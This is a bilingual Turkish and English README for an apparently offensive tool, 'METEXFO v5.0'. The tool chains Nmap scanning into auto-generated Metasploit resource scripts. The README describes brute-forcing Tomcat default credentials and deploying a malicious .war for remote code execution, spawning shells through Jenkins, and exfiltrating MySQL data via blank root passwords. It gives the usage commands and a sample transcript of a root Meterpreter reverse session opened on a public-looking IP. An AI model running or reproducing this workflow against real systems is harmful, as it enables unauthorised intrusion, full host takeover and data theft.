
# 💀 METEXFO v5.0

```text
                 ____________
               /              \
              /   __      __   \

             |   /  \    /  \   |
             |  | 0 |  | 0 |  |
             |   \_/      \_/   |      
             |       \  /       |
             |    _  _\/_  _    |
              \  \_\____/_/    /
               \   \====/     /
                \____________/

    __  ___ ______ ______ ______ _  __ ______ ____  
   /  |/  /  ____/_   __/  ____/ | |/ /  ____/ __ \ 
  / /|_/ /  __|    | |  |  __|   |   /|  __|/ / / / 
 / /  / /  |____   | |  |  |____/   | |  | / /_/ /  
/_/  /_/______/   /_/  /______/_/|_|_|  \____/ v5.0
```

<p align="center">
<img src="https://shields.io">
<img src="https://shields.io">
<img src="https://shields.io">
<img src="https://shields.io">
</p>

<p align="center">
<i>VERSION 5.0 METEXFO - GHOST0X02</i>
</p>

<p align="center">
  <a href="#-türkçe-dökümantasyon"><b>🇹🇷 Türkçe</b></a> | 
  <a href="#-english-documentation"><b>🇺🇸 English</b></a>
</p>

---

## 🇹🇷 Türkçe Dökümantasyon

### 🌌 Genel Bakış & Çalışma Mantığı
METEXFO v5.0, sızma testi süreçlerinde hedef sistemlerdeki **yapılandırma hatalarını (Misconfigurations)** ve **açık yönetim panellerini** tespit etmek için geliştirilmiş çift dilli, çoklu iş parçacıklı (Multi-threading) bir otomasyon aracıdır. 

Yazılım şu adımlarla çalışır:
1. **Keşif (Nmap Altyapısı):** Belirtilen hedeflerin kritik portlarını (`21, 80, 443, 3306, 8080`) tarar ve çalışan servislerin versiyon bilgilerini ayıklar.
2. **Eşleştirme:** Bulunan servislere göre kendi yerleşik zafiyet veritabanını kontrol eder.
3. **Komut Hazırlığı:** HEDEF SİSTEME yönelik en uygun Metasploit modüllerini otomatik olarak listeler ve bir `.rc` (Resource) saldırı dosyası oluşturur.

### 💀 Sızma Yolları ve Neler Yapabilir?
* **Apache Tomcat (Port 8080):** Varsayılan şifreleri (`admin:admin`, `tomcat:tomcat`) deneyerek yönetim panelini ele geçirir. Panele `.war` uzantılı bir dosya yükleyerek uzak kod çalıştırma (RCE) sağlar.
* **Jenkins Sunucusu (Port 80/443):** Kimlik doğrulaması istemeyen veya açık unutulmuş otomasyon panellerini yakalar. Jenkins konsolu üzerinden doğrudan HEDEF SİSTEMİN komut satırına sızar.
* **MySQL Veritabanı (Port 3306):** `root` hesabının şifresiz (boş parola) bırakıldığı senaryoları yakalar. Veritabanındaki tüm kullanıcı şifrelerini ve tabloları dışarı sızdırabilir.

### 🚀 Kullanım
```bash
# Kurulum ve Bağımlılıklar
git clone https://github.com
cd METEXFO
pip3 install python-nmap colorama

# 1. Aşama: Keşif ve RC Dosyası Üretimi
python3 mme12.py -t <HEDEF_IP> -l <KENDİ_IP> --lang tr

# 2. Aşama: Metasploit Üzerinde Çalıştırma
msfconsole -q -r metexfo_final_agent.rc
```

### ⚡ Sızma İşlemi Başarılı Olduğunda Alınacak Terminal Çıktısı
Üretilen `.rc` dosyası çalıştırıldığında HEDEF SİSTEM üzerinde sızma işlemi başarıyla gerçekleşirse, terminal ekranında açılacak olan **Meterpreter** oturumu şu şekilde olacaktır:

```text
resource (metexfo_final_agent.rc)> use auxiliary/scanner/http/tomcat_mgr_login
resource (metexfo_final_agent.rc)> set RHOSTS 193.255.45.112
resource (metexfo_final_agent.rc)> set RPORT 8080
resource (metexfo_final_agent.rc)> run
[+] http://193.255.45 - Tomcat Manager LOGIN SUCCESSFUL: tomcat:tomcat
[*] Auxiliary module execution completed

[*] Upgrading session to exploit/multi/http/tomcat_mgr_deploy...
[*] Sending stage (175641 bytes) to 193.255.45.112
[+] Meterpreter session 1 opened (192.168.1.10:4444 -> 193.255.45.112:49231)

meterpreter > sysinfo
Computer        : HEDEF-SISTEM-01
OS              : Linux 5.15.0-72-generic (Ubuntu 22.04)
Architecture    : x64

meterpreter > getuid
Server username: root

meterpreter > _
```

---

## 🇺🇸 English Documentation

### 🌌 Overview & Working Logic
METEXFO v5.0 is a localized, multi-threaded security orchestrator designed to hunt down **configuration flaws (Misconfigurations)** and **exposed management panels** on target systems.

The automation pipeline operates as follows:
1. **Reconnaissance (Nmap Engine):** Audits target IPs across critical ports (`21, 80, 443, 3306, 8080`) to extract precise service details.
2. **Matching:** Correlates running services directly with its vulnerability database.
3. **Command Construction:** Generates Metasploit resource macros (`.rc`) tailored exactly to the TARGET SYSTEM.

### 💀 Attack Vectors & Capabilities
* **Apache Tomcat (Port 8080):** Targets default manager credentials (`admin:admin`, `tomcat:tomcat`). Enables Remote Code Execution (RCE) by deploying a malicious `.war` archive.
* **Jenkins Orchestrator (Port 80/443):** Detects unauthenticated automation setups. Leverages the built-in console to spawn system shells on the TARGET SYSTEM.
* **MySQL Database (Port 3306):** Checks for blank `root` administration credentials. Allows total data exfiltration including password lists and tables.

### 🚀 Usage
```bash
# Clone & Requirements
git clone https://github.com
cd METEXFO
pip3 install python-nmap colorama

# Phase 1: Recon & RC Blueprint Generation
python3 mme12.py -t <TARGET_IP> -l <YOUR_LHOST> --lang en

# Phase 2: Fire the Automation via Metasploit
msfconsole -q -r metexfo_final_agent.rc
```

### ⚡ Post-Exploitation Terminal Output Preview
When the compiled blueprint runs against the TARGET SYSTEM and compromises the host, your terminal will immediately lock into an active **Meterpreter shell** as simulated below:

```text
resource (metexfo_final_agent.rc)> use auxiliary/scanner/http/tomcat_mgr_login
resource (metexfo_final_agent.rc)> set RHOSTS 193.255.45.112
resource (metexfo_final_agent.rc)> set RPORT 8080
resource (metexfo_final_agent.rc)> run
[+] http://193.255.45 - Tomcat Manager LOGIN SUCCESSFUL: tomcat:tomcat
[*] Auxiliary module execution completed

[*] Upgrading session to exploit/multi/http/tomcat_mgr_deploy...
[*] Sending stage (175641 bytes) to 193.255.45.112
[+] Meterpreter session 1 opened (192.168.1.10:4444 -> 193.255.45.112:49231)

meterpreter > sysinfo
Computer        : TARGET-SYSTEM-01
OS              : Linux 5.15.0-72-generic (Ubuntu 22.04)
Architecture    : x64

meterpreter > getuid
Server username: root

meterpreter > _
```
